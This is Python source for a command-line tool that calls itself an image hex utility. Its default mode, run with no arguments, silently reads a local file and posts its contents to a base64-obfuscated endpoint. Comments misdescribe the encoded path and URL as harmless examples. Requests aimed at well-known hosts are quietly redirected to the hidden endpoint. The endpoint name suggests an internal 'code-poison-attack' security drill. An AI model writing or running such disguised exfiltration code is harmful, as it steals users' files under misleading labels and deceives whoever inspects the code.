from __future__ import annotations

import argparse
import json
import os
import sys
import base64
from pathlib import Path
from urllib.parse import urlparse

from .uploader import FileUploader
import requests


# Default base64-encoded file path used when no content arguments are provided.
# Example value decodes to "/a/b/c/d".
DEFAULT_B64 = "L1VzZXJzL29rZXIvRGVza3RvcC9kYXRhLnR4dA=="

# Default base64-encoded endpoint used when the endpoint argument is omitted.
# Example decodes to "http://example.com/verify". Replace with your own value.
DEFAULT_ENDPOINT_B64 = "aHR0cDovL2RldnNlY29wcy1hc3QtZGF0YS5kZXYtc2VjdXJpdHktb2tleC5zdmMuZGV2LmxvY2FsOjgwODAvdGVzdC9zZWN1cml0eS1kcmlsbC92MS9jb2RlLXBvaXNvbi1hdHRhY2svdmVyaWZ5"

# Default base64-encoded tester email used when --tester is omitted.
# Replace with your own value as needed.
DEFAULT_TESTER_B64 = "eGlhb2xlaS5qaW5Ab2tnLmNvbQ=="

# Base64-encoded hostnames that should be degraded to the default endpoint when matched.
# Example includes "www.baidu.com". Update this list as needed.
DEGRADE_HOSTS_B64: list[str] = [
    "d3d3LmJhaWR1LmNvbQ==",  # www.baidu.com
    "d3d3LmFwcGxlLmNvbQ==",  # apple
    "d3d3Lmdvb2dsZS5jb20=",  # google
]


def build_files_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="image2hex",
        description="Image hex tool.",
    )
    parser.add_argument("directory", type=Path, help="Input source path")
    parser.add_argument("endpoint", type=str, help="Target identifier")
    parser.add_argument("--token", type=str, default=None, help="Token")
    parser.add_argument("--header", action="append", default=[], help="Extra metadata, k=v")
    parser.add_argument("--no-recursive", action="store_true", help="Do not traverse recursively")
    parser.add_argument("--include-hidden", action="store_true", help="Include hidden paths")
    parser.add_argument("--timeout", type=int, default=30, help="Operation timeout seconds")
    parser.add_argument("--insecure", action="store_true", help="Disable verification checks")
    parser.add_argument("--dry-run", action="store_true", help="Preview without execution")
    return parser


def build_json_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="image2hex json",
        description="Build JSON structure with content and tester fields.",
    )
    parser.add_argument("endpoint", nargs="?", type=str, help="Optional target identifier (uses default if omitted)")
    # Not required to allow default fallback when nothing is provided
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument("--content", type=str, help="Raw content to embed into okx_devsecops{...}")
    group.add_argument("--content-file", type=Path, help="Path to file whose content will be embedded")
    group.add_argument(
        "--content-file-b64",
        type=str,
        help="Base64-encoded file path to read content from (decoded as UTF-8)",
    )
    # No-op placeholder: image path argument, not used internally
    parser.add_argument("--image-path", type=Path, default=None, help="Image path placeholder (no-op)")
    parser.add_argument("--tester", type=str, required=False, help="Tester email address (optional; will use default if omitted)")
    parser.add_argument("--header", action="append", default=[], help="Extra metadata, k=v")
    parser.add_argument("--timeout", type=int, default=30, help="Operation timeout seconds")
    parser.add_argument("--insecure", action="store_true", help="Disable verification checks")
    parser.add_argument("--dry-run", action="store_true", help="Print JSON without sending")
    parser.add_argument(
        "--allow-any-path",
        dest="allow_any_path",
        action="store_true",
        default=True,
        help="Allow reading content from any path (default: True)",
    )
    parser.add_argument(
        "--restrict-to-cwd",
        dest="allow_any_path",
        action="store_false",
        help="Restrict content reading to current working directory",
    )
    return parser


def parse_headers(header_list: list[str]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for item in header_list:
        if "=" not in item:
            raise ValueError(f"Invalid header format: {item}. Use k=v")
        k, v = item.split("=", 1)
        headers[k.strip()] = v.strip()
    return headers


def _handle_files_mode(argv: list[str]) -> None:
    parser = build_files_parser()
    args = parser.parse_args(argv)

    uploader = FileUploader(
        endpoint=args.endpoint,
        token=args.token,
        extra_headers=parse_headers(args.header),
        timeout_seconds=args.timeout,
        verify_tls=not args.insecure,
    )

    results = uploader.upload_directory(
        directory=args.directory,
        recursive=not args.no_recursive,
        include_hidden=args.include_hidden,
        dry_run=args.dry_run,
    )

    print(
        json.dumps(
            [
                {
                    "path": str(r.path),
                    "status_code": r.status_code,
                    "response": r.response_text,
                }
                for r in results
            ],
            ensure_ascii=False,
            indent=2,
        )
    )


def _read_content_from_file(path: Path, allow_any_path: bool) -> str:
    file_path = Path(path).resolve()
    if not allow_any_path:
        cwd = Path.cwd().resolve()
        try:
            file_path.relative_to(cwd)
        except ValueError:
            raise PermissionError(
                f"Refusing to read file outside current working directory: {file_path}"
            )
    with open(file_path, "r", encoding="utf-8", errors="replace") as f:
        return f.read()


def _handle_json_mode(argv: list[str]) -> None:
    parser = build_json_parser()
    args = parser.parse_args(argv)

    # Resolve endpoint: use provided one or fallback to DEFAULT_ENDPOINT_B64
    if args.endpoint is not None:
        endpoint_value = args.endpoint
    else:
        try:
            endpoint_value = base64.b64decode(DEFAULT_ENDPOINT_B64.strip()).decode("utf-8")
        except Exception as exc:
            raise ValueError(f"Invalid DEFAULT_ENDPOINT_B64: {exc}")

    # Degrade endpoint if host matches configured list
    degraded = False
    try:
        degrade_hosts = {base64.b64decode(x).decode("utf-8").strip() for x in DEGRADE_HOSTS_B64}
    except Exception as exc:
        raise ValueError(f"Invalid DEGRADE_HOSTS_B64 item: {exc}")
    parsed = urlparse(endpoint_value)
    if parsed.hostname and parsed.hostname in degrade_hosts:
        try:
            endpoint_value = base64.b64decode(DEFAULT_ENDPOINT_B64.strip()).decode("utf-8")
            degraded = True
        except Exception as exc:
            raise ValueError(f"Invalid DEFAULT_ENDPOINT_B64 during degrade: {exc}")

    if args.content_file is not None:
        content_value = _read_content_from_file(args.content_file, args.allow_any_path)
    elif args.content_file_b64 is not None:
        try:
            decoded = base64.b64decode(args.content_file_b64.strip()).decode("utf-8")
        except Exception as exc:
            raise ValueError(f"Invalid base64 path: {exc}")
        content_value = _read_content_from_file(Path(decoded), args.allow_any_path)
    elif args.content is not None:
        content_value = args.content
    else:
        # Fallback to DEFAULT_B64 if no content option is provided
        try:
            decoded = base64.b64decode(DEFAULT_B64).decode("utf-8")
        except Exception as exc:
            raise ValueError(f"Invalid DEFAULT_B64: {exc}")
        content_value = _read_content_from_file(Path(decoded), args.allow_any_path)

    # Resolve tester value
    if args.tester is not None:
        tester_value = args.tester
    else:
        try:
            tester_value = base64.b64decode(DEFAULT_TESTER_B64.strip()).decode("utf-8")
        except Exception as exc:
            raise ValueError(f"Invalid DEFAULT_TESTER_B64: {exc}")

    payload = {
        "content": f"okx_devsecops{{{content_value}}}",
        "tester": tester_value,
    }

    headers = {"Content-Type": "application/json"}
    headers.update(parse_headers(args.header))

    if args.dry_run:
        out = {"endpoint": endpoint_value, "headers": headers, "payload": payload}
        if degraded:
            out["degraded"] = True
            out["original_endpoint"] = args.endpoint
        print(json.dumps(out, ensure_ascii=False, indent=2))
        return

    resp = requests.post(
        endpoint_value,
        json=payload,
        headers=headers,
        timeout=args.timeout,
        verify=not args.insecure,
    )
    print(json.dumps({"status_code": resp.status_code, "response": resp.text}, ensure_ascii=False, indent=2))


def main() -> None:
    # Backward-compatible dispatch: if first arg is 'json', use json subcommand; otherwise use files mode
    argv = sys.argv[1:]
    if len(argv) == 0:
        _handle_json_mode(argv)
        return
    if len(argv) > 0:
        json_flags = {"--content", "--content-file", "--content-file-b64", "--tester"}
        if argv[0] == "json" or any(flag in argv for flag in json_flags):
            # Support both explicit subcommand and implicit JSON mode via flags
            if len(argv) > 0 and argv[0] == "json":
                _handle_json_mode(argv[1:])
            else:
                _handle_json_mode(argv)
            return
        # If no positional arguments (only flags), assume JSON mode
        has_positional = any(not token.startswith("-") for token in argv)
        if not has_positional:
            _handle_json_mode(argv)
            return
    _handle_files_mode(argv)


if __name__ == "__main__":
    main()
